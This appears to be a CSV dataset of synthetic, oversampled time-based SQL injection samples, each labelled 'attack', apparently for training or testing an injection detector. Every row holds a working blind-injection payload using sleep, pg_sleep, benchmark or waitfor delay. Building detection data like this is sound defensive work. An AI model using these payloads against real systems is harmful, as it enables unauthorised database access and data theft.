id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000178,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,0.035001966944319486
SMOTE_000179,attack,time,"1   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000240,0.8819700340428281
SMOTE_000180,attack,time,"1%""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000293,0.0443599196971053
SMOTE_000181,attack,time,"1'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000126,0.09139756972850019
SMOTE_000182,attack,time,"1""   )    )    as klie where 2840  =  2840 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000052,1.6593914293466392
SMOTE_000183,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'fuvv'  =  'fuvv,nearest_attack_euclidean,R000225,0.22459387588899474
SMOTE_000184,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'nond'  =  'nond",nearest_attack_euclidean,R000119,0.7526622527113479
SMOTE_000185,attack,time,select sleep  (  5  )   and    (    (   'mmvf' like 'mmvf,nearest_attack_euclidean,R000084,1.1415399080261577
SMOTE_000186,attack,time,"1%""   )    )    waitfor delay '0:0:5' and    (    (   ""%""  =  """,nearest_attack_euclidean,R000222,1.0326102993388064
SMOTE_000187,attack,time,"1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000045,0.9619452112574026
SMOTE_000188,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,0.05477407613828995
SMOTE_000189,attack,time,1'   )    )     )   and sleep  (  5  )  #,nearest_attack_euclidean,R000221,0.5307419786257258
SMOTE_000190,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,0.24495656473530475
SMOTE_000191,attack,time,"waitfor delay '0:0:5' and   (  ""ludp"" like ""ludp",nearest_attack_euclidean,R000099,0.37344316823834034
SMOTE_000192,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000287,0.04017953204723687
SMOTE_000193,attack,time,"1""   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --",nearest_attack_euclidean,R000279,1.7524436985253875
SMOTE_000194,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   ",nearest_attack_euclidean,R000129,1.673231621910994
SMOTE_000195,attack,time,1%'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000244,1.6545669982068139
SMOTE_000196,attack,time,1   )    )    as msug where 3503  =  3503 and sleep  (  5  )  #,nearest_attack_euclidean,R000201,0.5042604800372825
SMOTE_000197,attack,time,"1"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000213,0.13077585075150958
SMOTE_000198,attack,time,1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000053,0.8437285963852441
SMOTE_000199,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000249,0.39983062627110405
SMOTE_000200,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'fuvv'  =  'fuvv,nearest_attack_euclidean,R000225,0.7527360766847971
